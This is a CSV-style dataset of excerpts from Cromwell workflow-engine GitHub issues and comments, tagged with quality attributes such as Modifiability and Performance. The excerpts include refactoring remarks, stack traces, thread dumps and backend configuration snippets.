Modifiability,"~~@ffinfo just to be clear - unless the script explodes in a **really** unusual way, you should _always_ eventually get a return code file. So for us, waiting for it to appear is sufficient. (e.g. even if a command fails, we still get the return code file).~~. ~~In fact, in previous Cromwell versions (before making these backends ""config-file based"") our hard-coded local and SGE backends waited for the return code file and never checked `isAlive` apart from at restart-time.~~. ~~Just so I can understand, is there a specific reason that you don't believe that an `rc` file will eventually be produced for your situation? (and if so, could we maybe try to protect that instead?)~~. EDIT: I just read the gitter log you copied above. I think I see now!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243137051:333,config,config-file,333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243137051,2,['config'],['config-file']
Modifiability,~~Going to refactor this a little~~ EDIT: no I'm not,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5032#issuecomment-502847254:11,refactor,refactor,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5032#issuecomment-502847254,1,['refactor'],['refactor']
Modifiability,"~~There's a few slick horrors in here. Any advice for refactoring the worst offenders would be welcomed~~. Thanks to @mcovarr, horrors are mostly erased",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1268:54,refactor,refactoring,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1268,1,['refactor'],['refactoring']
Modifiability,… if it'll be run.; - Convert WdlNamespace into a sum type w/ a worfklowless and workflowed version; - Workflowless namespaces are valid but not runnable; - Decompose monolithic WdlNamespace constructor to separate local workflow logic into workflowed namespaces only; - Decompose validation logic of a Namespace's component parts into the construction of those parts; - Minor refactorings; - Many FIXMEs posing as TODOs and TODOs as well; - Some commentary on old stuff I found particularly confusing in an attempt to work through them,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/88:377,refactor,refactorings,377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/88,1,['refactor'],['refactorings']
Modifiability,…age information. Practically non-existent comments.; Tests are incomplete / non-unit tests. May mock out a true client.; Google authentication not pulled from credentials. TODO: look at JES client auth.; May refactor location / names of classes.; Typoes.; Etc.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/291:209,refactor,refactor,209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/291,1,['refactor'],['refactor']
Modifiability,"…ed to mount that into the docker image by using JES disk input parameters, which it turns out you have to specify both at pipeline time and runtime (question out to Garrick). This is important because currently if you try to localize or produce more than 10gb of input your pipeline will die. This bumps that up to 100G of local ssd. Eventually, after getting some road time, we might want to think about how to parameterize this so users could specify/override",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/153:413,parameteriz,parameterize,413,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/153,1,['parameteriz'],['parameterize']
Modifiability,…large outputs. Removed unused env variables.; Write reconfigured script to working path for auditing purposes. Signed-off-by: markjschreiber <markjschreiber@gmail.com>,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5554:35,variab,variables,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5554,1,['variab'],['variables']
Modifiability,"…t specified. Instead of failing if there is no ""auth_bucket"" in the workflow options, fallback to the workflow execution directory.; This also fix a bug where the auth file would not be uploaded if we only have docker configuration but no refresh token / auth_bucket option.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/320:219,config,configuration,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/320,1,['config'],['configuration']
Modifiability,👍 . ToL: Since they all extend the `BatchingDbWriterActor` trait we could even put this logging there instead. [![Approved with PullApprove](https://img.shields.io/badge/reviewers-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2543/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2543#issuecomment-321990621:24,extend,extend,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2543#issuecomment-321990621,1,['extend'],['extend']
Modifiability,"🤔. After looking at things like `GcsBatchIsDirectoryCommand` that does accept blobs without paths, FYI my approach to `develop` may be different. I think this band-aid for a very specific known case **might be** fine for 53, but my `develop` PR will likely label ""`BlobId` instances that allowed to have no object"" vs. ""`BlobId` instances that represents a pseudo directory, like `backend.providers.Papi.config.root = ""gs://kshakir-dsde-cromwell-dev""`""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719663718:404,config,config,404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719663718,1,['config'],['config']
Performance,	at slick.dbio.DBIOAction$$anon$4.run(DBIOAction.scala:238); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.$anonfun$run$4(DBIOAction.scala:534); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.$anonfun$run$4$adapted(DBIOAction.scala:534); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.run(DBIOAction.scala:534); 	at slick.dbio.SynchronousDatabaseAction$$anon$11.run(DBIOAction.scala:571); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:240); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:240); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: org.hsqldb.HsqlException: java.lang.OutOfMemoryError: Java heap space; 	at org.hsqldb.error.Error.error(Unknown Source); 	at org.hsqldb.SessionData.allocateLobForResult(Unknown Source); 	at org.hsqldb.Session.allocateResultLob(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.performPreExecute(Unknown Source); 	... 42 common frames omitted; Caused by: java.lang.OutOfMemoryError: Java heap space; 	at org.hsqldb.persist.LobStoreMem.setBlockBytes(Unknown Source); 	at org.hsqldb.persist.LobManager.setBytesISNormal(Unknown Source); 	at org.hsqldb.persist.LobManager.setBytesIS(Unknown Source); 	at org.hsqldb.persist.LobManager.setCharsForNewClob(Unknown Source); 	at org.hsqldb.SessionData.allocateLobForResult(Unknown Source); 	at org.hsqldb.Session.allocateResultLob(Unknown Source);,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387:5353,concurren,concurrent,5353,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387,2,['concurren'],['concurrent']
Performance, 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: target not exists: s3://s3.amazonaws.com/atbiofx-cromwell/cromwell-execution/demux_only/a67833cb-b894-4790-872f-9f3104cab60c/call-illumina_demux/illumina_demux-rc.txt; 	at org.lerch.s3fs.S3SeekableByteChannel.<init>(S3SeekableByteChannel.java:50); 	at org.lerch.s3fs.S3FileSystemProvider.newByteChannel(S3FileSystemProvider.java:359); 	at java.nio.file.Files.newByteChannel(Files.java:361); 	at java.nio.file.Files.newByteChannel(Files.java:407); 	at java.nio.file.Files.readAllBytes(Files.java:3152); 	at better.files.File.loadBytes(File.scala:171); 	at better.files.File.byteArray(File.scala:174); 	at better.files.File.contentAsString(File.scala:214); 	at cromwell.core.path.BetterFileMethods.contentAsString(BetterFileMethods.scala:112); 	at cromwell.core.path.BetterFileMethods.contentAsString$(BetterFileMethods.scala:112); 	at cromwell.filesystems.s3.S3Path.contentAsString(S3PathBuilder.scala:157); 	at cromwell.core.path.EvenBetterPathMethods.readContentAsString(EvenBetterPathMethods.scala:90); 	at cromwell.core.path.EvenBetterPathMethods.readContentAsString$(EvenBetterPathMethods.scala:90); 	at cromwell.filesystems.s3.S3Path.readContentAsString(S3PathBuilder.scala:157); 	at cromwell.engine.io.nio.NioFlow.$anonfun$readAsString$4(NioFlow.scala:92); 	at scala.concurrent.Future$.$anonfun$apply$1(Future.scala:654); 	at scala.util.Success.$anonfun$map$1(Try.scala:251); 	at scala.util.Success.map(Try.scala:209); 	at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); 	at scala.concurrent.impl.Promise.liftedTree1,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3774:22988,load,loadBytes,22988,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3774,1,['load'],['loadBytes']
Performance, 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: org.hsqldb.HsqlException: java.lang.OutOfMemoryError: Java heap space; 	at org.hsqldb.error.Error.error(Unknown Source); 	at org.hsqldb.SessionData.allocateLobForResult(Unknown Source); 	at org.hsqldb.Session.allocateResultLob(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.performPreExecute(Unknown Source); 	... 42 common frames omitted; Caused by: java.lang.OutOfMemoryError: Java heap space; 	at org.hsqldb.persist.LobStoreMem.setBlockBytes(Unknown Source); 	at org.hsqldb.persist.LobManager.setBytesISNormal(Unknown Source); 	at org.hsqldb.persist.LobManager.setBytesIS(Unknown Source); 	at org.hsqldb.persist.LobManager.setCharsForNewClob(Unknown Source); 	at org.hsqldb.SessionData.allocateLobForResult(Unknown Source); 	at org.hsqldb.Session.allocateResultLob(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.performPreExecute(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.addBatch(Unknown Source); 	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.addBatch(HikariProxyPreparedStatement.java); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$15(JdbcActionComponent.scala:531); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$15$adapted(JdbcActionComponent.scala:529); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction$$Lambda$1955/223664727.apply(Unknown Source); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71). 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.jdbc.JdbcActionComponent$InsertActionC,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387:15551,perform,performPreExecute,15551,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387,1,['perform'],['performPreExecute']
Performance, 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: org.hsqldb.HsqlException: java.lang.OutOfMemoryError: Java heap space; 	at org.hsqldb.error.Error.error(Unknown Source); 	at org.hsqldb.SessionData.allocateLobForResult(Unknown Source); 	at org.hsqldb.Session.allocateResultLob(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.performPreExecute(Unknown Source); 	... 42 common frames omitted; Caused by: java.lang.OutOfMemoryError: Java heap space; 	at org.hsqldb.persist.LobStoreMem.setBlockBytes(Unknown Source); 	at org.hsqldb.persist.LobManager.setBytesISNormal(Unknown Source); 	at org.hsqldb.persist.LobManager.setBytesIS(Unknown Source); 	at org.hsqldb.persist.LobManager.setCharsForNewClob(Unknown Source); 	at org.hsqldb.SessionData.allocateLobForResult(Unknown Source); 	at org.hsqldb.Session.allocateResultLob(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.performPreExecute(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.addBatch(Unknown Source); 	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.addBatch(HikariProxyPreparedStatement.java); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$15(JdbcActionComponent.scala:531); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$15$adapted(JdbcActionComponent.scala:529); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction$$Lambda$1955/223664727.apply(Unknown Source); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.jdbc.JdbcActionComponent$InsertActionC,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387:6402,perform,performPreExecute,6402,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387,1,['perform'],['performPreExecute']
Performance," ""Sucessfully pulled ${docker}"". bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpu} \; -R 'rusage[mem=${memory_mb}] span[hosts=1]' \; -M ${memory_mb} \; singularity exec --containall $SINGULARITY_MOUNTS --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}; """""". job-id-regex = ""Job <(\\d+)>.*""; kill = ""bkill ${job_id}""; kill-docker = ""bkill ${job_id}""; check-alive = ""bjobs -w ${job_id} |& egrep -qvw 'not found|EXIT|JOBID'"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [; ""soft-link"", ""copy"", ""hard-link""; ]; hashing-strategy: ""path+modtime""; }; }; }; }; }; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3;; hsqldb.log_size=0; """"""; connectionTimeout = 86400000; numThreads = 2; }; insert-batch-size = 2000; read-batch-size = 5000000; write-batch-size = 5000000; metadata {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-metadata-db/;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3;; hsqldb.log_size=0; """"""; connectionTimeout = 86400000; numThreads = 2; }; insert-batch-size = 2000; read-batch-size = 5000000; write-batch-size = 5000000; }; }. services {; MetadataService {; metadata-read-row-number-safety-threshold = 5000000; }; }; ```; The main issue that I can see is that Cromwell is ign",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7203:2735,cache,cached,2735,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7203,1,['cache'],['cached']
Performance," #14 prio=5 os_prio=31 tid=0x00007fb76aa14800 nid=0x6103 runnable [0x00000001295b3000]; java.lang.Thread.State: RUNNABLE; at com.jprofiler.agent.InstrumentationCallee.exitFilteredMethod(Native Method); at com.jprofiler.agent.InstrumentationCallee.__ejt_filter_exitMethod(ejt:86); at akka.actor.LightArrayRevolverScheduler.clock(Scheduler.scala:213); at akka.actor.LightArrayRevolverScheduler$$anon$8.nextTick(Redefined); at akka.actor.LightArrayRevolverScheduler$$anon$8.run(Redefined); at java.lang.Thread.run(Redefined). ""cromwell-system-akka.actor.default-dispatcher-4"" #13 prio=5 os_prio=31 tid=0x00007fb76b38c000 nid=0x5f03 waiting on condition [0x000000012ac3d000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c002f9e0> (a akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(Redefined); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(Redefined); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java). ""cromwell-system-scheduler-1"" #10 prio=5 os_prio=31 tid=0x00007fb76b20f000 nid=0x5a07 runnable [0x000000012a0e1000]; java.lang.Thread.State: RUNNABLE; at com.jprofiler.agent.InstrumentationCallee.exitFilteredMethod(Native Method); at com.jprofiler.agent.InstrumentationCallee.__ejt_filter_exitMethod(ejt:86); at akka.dispatch.AbstractNodeQueue$Node.next(AbstractNodeQueue.java:124); at akka.dispatch.AbstractNodeQueue.pollNode(AbstractNodeQueue.java:86); at akka.actor.LightArrayRevolverScheduler$$anon$8.executeBucket$1(Scheduler.scala:411); at akka.actor.LightArrayRevolverScheduler$$anon$8.nextTick(Redefined); at akka.actor.LightArrayRevolverScheduler$$anon$8.run(Redefined); at java.lang.Thread.run(Redefined). ""Service Thread"" #9 daemon prio=9 os_prio=31 tid=0x00007fb76a82e000 nid=0x5103 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""C1 CompilerThread3"" #8 daemon prio=9 os_prio=31 tid=0x00007fb76a060000 n",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:47617,concurren,concurrent,47617,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," *** FAILED *** (3 minutes, 18 seconds); - should fail during execution relative_output_paths_colliding *** FAILED *** (3 minutes, 27 seconds); - should successfully run curl *** FAILED *** (8 minutes, 38 seconds); - should successfully run cwl_cache_within_workflow *** FAILED *** (2 minutes, 49 seconds); - should successfully run cwl_import_type_packed *** FAILED *** (3 minutes, 43 seconds); - should successfully run cwl_interpolated_strings *** FAILED *** (2 minutes, 49 seconds); - should successfully run cwl_relative_imports_url *** FAILED *** (3 minutes, 37 seconds); - should successfully run cwl_relative_imports_zip *** FAILED *** (2 minutes, 52 seconds); - should successfully run docker_hash_dockerhub *** FAILED *** (5 minutes, 18 seconds); - should successfully run docker_hash_gcr *** FAILED *** (5 minutes, 31 seconds); - should successfully run docker_hash_quay *** FAILED *** (4 minutes, 31 seconds); - should successfully run hello *** FAILED *** (2 minutes, 54 seconds); - should successfully run hello_yaml *** FAILED *** (2 minutes, 47 seconds); - should successfully run inline_file *** FAILED *** (3 minutes, 4 seconds); - should successfully run inline_file_custom_entryname *** FAILED *** (3 minutes, 9 seconds); - should successfully run iwdr_input_string *** FAILED *** (3 minutes, 10 seconds); - should successfully run iwdr_input_string_function *** FAILED *** (2 minutes, 59 seconds); - should successfully run non_root_default_user *** FAILED *** (3 minutes, 20 seconds); - should successfully run relative_output_paths *** FAILED *** (2 minutes, 42 seconds); - should successfully run space *** FAILED *** (4 minutes, 18 seconds); - should successfully run standard_output_paths_colliding_prevented *** FAILED *** (3 minutes, 1 second); - should successfully run three_step_cwl *** FAILED *** (5 minutes, 29 seconds); - should NOT call cache the second run of readFromCacheFalse (3 minutes, 21 seconds); - should abort a workflow immediately after submission abort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:2448,cache,cache,2448,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,1,['cache'],['cache']
Performance," - 0.23. ```; ....snip...; [2016-12-06 01:52:49,82] [warn] Unrecognized configuration key(s) for Jes: genomics-api-queries-per-100-seconds, dockerhub.token, dockerhub.account, genomics.compute-service-account; ....snip....; ```. As far as I can tell, I am using the same keys as in the reference conf file. Worked in previous dev builds with same structure (though fewer keys). @kcibul This is important, though I would not be surprised if this was user error. From the configuration:. ```; ...snip...; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; # Google project; project = ""broad-dsde-methods""; ; # Base bucket for workflow executions; root = ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/""; ; # Set this to the lower of the two values ""Queries per 100 seconds"" and ""Queries per 100 seconds per user"" for; # your project.; #; # Used to help determine maximum throughput to the Google Genomics API. Setting this value too low will; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 1000; ; # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; ; # Optional Dockerhub Credentials. Can be used to access private docker images. REMOVED HERE; dockerhub {; account = ""user_manually_removed""; token = ""password_manually_removed""; }; ; genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""application-default""; ; // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce accoun",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1748:1071,perform,performance,1071,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1748,1,['perform'],['performance']
Performance," - locked <0x00000006c00301d8> (a java.lang.ref.Reference$Lock). ""main"" #1 prio=5 os_prio=31 tid=0x00007fb76a803000 nid=0xf07 waiting on condition [0x000000010b088000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c061d308> (a scala.concurrent.impl.Promise$CompletionLatch); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at scala.concurrent.impl.Promise$DefaultPromise.tryAwait(Promise.scala:199); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala); at scala.concurrent.Await$.ready(package.scala:169); at cromwell.Main.cromwell$Main$$waitAndExit(Main.scala); at cromwell.Main$$anonfun$runServer$2.apply$mcI$sp(Main.scala:109); at cromwell.Main.continueIf(Main.scala); at cromwell.Main.runServer(Main.scala:109); at cromwell.Main.runAction(Main.scala:103); at cromwell.Main$.delayedEndpoint$cromwell$Main$1(Main.scala:49); at cromwell.Main$delayedInit$body.apply(Main.scala); at scala.Function0$class.apply$mcV$sp(Function0.scala); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala); at scala.App$$anonfun$main$1.apply(App.scala); at scala.App$$anonfun$main$1.apply(App.scala); at scala.collection.immutable.List.foreach(List.scala:380); at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala); ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:51145,concurren,concurrent,51145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," - valueFrom: $(inputs.radius); - valueFrom: ""*""; shellQuote: false; - valueFrom: $(inputs.radius); - valueFrom: ""`""; shellQuote: false; stdout: stdout.txt; ```. ```; name: cwl_caching; testFormat: workflowsuccess; backendsMode: ""only""; backends: [Local]; tags: [localdockertest]. files {; wdl: cwl_caching/cwl_caching.cwl; inputs: cwl_caching/cwl_caching.json; }. metadata {; status: Succeeded; }. workflowType: CWL; workflowTypeVersion: v1.0; ```. ```; cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'rCopy': No coercion defined from '1' of type 'Int' to 'Float'.; 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:688); 	at scala.util.Success.$anonfun$map$1(Try.scala:251); 	at scala.util.Success.map(Try.scala:209); 	at scala.concurrent.Future.$anonfun$map$1(Future.scala:289); 	at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); 	at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(Fo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3480:1850,concurren,concurrent,1850,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3480,1,['concurren'],['concurrent']
Performance," /cromwell-executions/detectFusions/962429bb-ddfa-456a; -ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa > /cromwell-executions/detectFusions/96242; 9bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa.cdna.psl.tmp; Reason:; Job command with nonzero return code; Return codes: 139; Job output:; Running on 2ecb3961d54d; Note: /usr/local/bin/gmap.avx2 does not exist. For faster speed, may want to compile package on an AVX2 machine; GMAP version 2018-07-04 called with args: /usr/local/bin/gmap.sse42 -D defuse-data/gmap -d cdna -f psl /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa; Checking compiler assumptions for SSE2: 6B8B4567 327B23C6 xor=59F066A1; Checking compiler assumptions for SSE4.1: -103 -58 max=198 => compiler zero extends; Checking compiler options for SSE4.2: 6B8B4567 __builtin_clz=1 __builtin_ctz=0 _mm_popcnt_u32=17 __builtin_popcount=17 ; Finished checking compiler assumptions; Pre-loading compressed genome (oligos)......done (78,222,840 bytes, 19098 pages, 0.00 sec); Pre-loading compressed genome (bits)......done (78,222,864 bytes, 19098 pages, 0.02 sec); Looking for index files in directory defuse-data/gmap/cdna; Pointers file is cdna.ref153offsets64meta; Offsets file is cdna.ref153offsets64strm; Positions file is cdna.ref153positions; Offsets compression type: bitpack64; Allocating memory for ref offset pointers, kmer 15, interval 3...Attached existing memory (2 attached) for defuse-data/gmap/cdna/cdna.ref153offsets64meta...done (134,217,744 bytes, 0.00 sec); Allocating memory for ref offsets, kmer 15, interval 3...Attached new memory for defuse-data/gmap/cdna/cdna.ref153offsets64strm...done (234,475,312 bytes, 0.23 sec); Pre-loading ref positions, kmer 15, interval 3......done (276,173,052 bytes, 0.05 sec); Starting alignment; Failed attempt to alloc 18446744073709550532 bytes; Exception: Allocation Failed raised",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465:1653,load,loading,1653,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465,1,['load'],['loading']
